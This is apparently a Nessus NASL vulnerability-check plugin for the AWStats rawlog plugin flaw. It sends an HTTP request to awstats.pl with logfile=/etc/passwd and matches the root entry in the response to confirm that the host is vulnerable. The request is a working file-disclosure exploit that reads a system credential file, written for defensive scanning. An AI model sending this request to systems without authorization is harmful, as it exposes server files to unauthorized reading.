#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security, Inc.
#
# Ref: Johnathan Bat <spam@blazemail.com>
#
# This script is released under the GNU GPLv2


include("compat.inc");

if(description)
{
 script_id(14347);

 script_bugtraq_id(10950);
 script_xref(name:"OSVDB", value:"9109");
 script_version ("$Revision: 1.12 $");

 script_name(english:"AWStats rawlog.pm logfile Parameter Arbitrary Command Execution");
 script_summary(english:"Determines the presence of AWstats awstats.pl");
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a logfile analyzer that is affected by an
input validation vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running AWStats, a free real-tim logfile analyzer.

The AWStats Rawlog Plugin which is installed is prone to an input
validation vulnerability. The issue exists in the 'logfile' URI data
passwed to the 'awstats.pl' script. An attacker may exploit this to
execute commands remotely or read files subject to the privileges of
the affected web server." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the AWStats 6.4 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();

 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"CGI abuses");
 
 script_dependencies("awstats_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);

function check(url)
{
	local_var req, res;
	req = http_get(port:port, item:url + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + get_host_name() + "&framename=main&pluginmode=rawlog&logfile=/etc/passwd");
 	res = http_keepalive_send_recv(port:port, data:req);
 	if ( res == NULL ) 
		exit(0);
	if ( egrep(pattern:"root:.*:0:[01]:.*", string:res) )
	{
	 	security_hole(port);
	 	exit(0);
	}
}

# Test an install.
install = get_kb_item(string("www/", port, "/AWStats"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches))
{
  dir = matches[2];
  check(url:dir);
}
